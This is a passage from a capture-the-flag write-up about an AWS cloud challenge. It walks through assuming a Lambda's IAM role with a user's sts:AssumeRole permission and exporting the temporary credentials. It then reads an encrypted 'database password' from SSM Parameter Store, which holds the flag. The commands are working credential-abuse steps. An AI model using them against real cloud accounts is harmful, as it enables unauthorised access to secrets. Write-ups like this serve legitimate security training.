This command successfully assumed the Lambda's role and saved the temporary credentials to `creds.json`. The fact that this worked indicated that the `devopsadmin` user had `sts:AssumeRole` permissions for the Lambda role - a common but potentially dangerous permission configuration.

**Step 5: Configure Temporary Credentials**

I extracted the temporary credentials from the JSON response and configured them as environment variables to use with the AWS CLI:

```bash
export AWS_ACCESS_KEY_ID=$(jq -r '.Credentials.AccessKeyId' creds.json)
export AWS_SECRET_ACCESS_KEY=$(jq -r '.Credentials.SecretAccessKey' creds.json)
export AWS_SESSION_TOKEN=$(jq -r '.Credentials.SessionToken' creds.json)
export AWS_DEFAULT_REGION=us-east-1
```

Now I was operating with the same permissions as the Lambda function itself.

**Step 6: Retrieve the Flag**

With the Lambda role credentials, I could now access the Systems Manager Parameter Store and retrieve the database password that the Lambda function uses:

```bash
aws ssm get-parameter --name "/production/database/password" --with-decryption
```

**Response:**
```json
{
    "Parameter": {
        "Name": "/production/database/password",
        "Type": "SecureString",
        "Value": "DUCTF{.*#--BosMutusOfTheTibetanPlateau--#*.}",
        "Version": 1,
        "LastModifiedDate": "2025-07-14T08:42:32.390000-04:00",
        "ARN": "arn:aws:ssm:us-east-1:487266254163:parameter/production/database/password",
        "DataType": "text"
    }
}
```
**Success!** The response revealed that the "database password" was actually the challenge flag. The parameter was stored as a `SecureString` type (encrypted) and contained the flag: `DUCTF{.*#--BosMutusOfTheTibetanPlateau--#*.}`.

The flag name is a clever reference to *Bos mutus* (wild yak), which is native to the Tibetan Plateau - perfectly fitting the Ministry of Australian Research into Yaks (MARY) theme.

**Flag:** `DUCTF{.*#--BosMutusOfTheTibetanPlateau--#*.}`
